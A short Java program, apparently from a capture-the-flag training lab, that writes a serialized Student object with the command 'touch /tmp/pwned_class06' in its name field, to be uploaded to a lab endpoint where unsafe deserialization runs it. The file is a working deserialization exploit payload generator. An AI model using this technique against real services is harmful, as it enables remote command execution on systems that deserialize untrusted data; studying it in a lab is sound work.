package class06;

import com.ctfstu.class06.Student;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import com.ctfstu.common.Logger;

/**
 * 生成 class06 的 payload — Javassist 字节码注入版 readObject → 命令执行
 * 目标: 上传 Student 对象，反序列化时通过 Javassist 动态生成字节码并加载
 * 与 class05 的区别: 不再写反射链，而是运行时动态生成新类的字节码
 * 靶场: /class06/upload
 */
public class GenPayload {
    public static void main(String[] args) throws Exception {
        Logger.setLogLevel(Logger.DEBUG);
        Student student = new Student("touch /tmp/pwned_class06", 18);

        ObjectOutputStream oos = new ObjectOutputStream(
                new FileOutputStream("class06.ser"));
        oos.writeObject(student);
        oos.close();

        System.out.println("✅ 已生成: class06.ser");
        System.out.println("命令已嵌入 name 字段: touch /tmp/pwned_class06");
    }
}
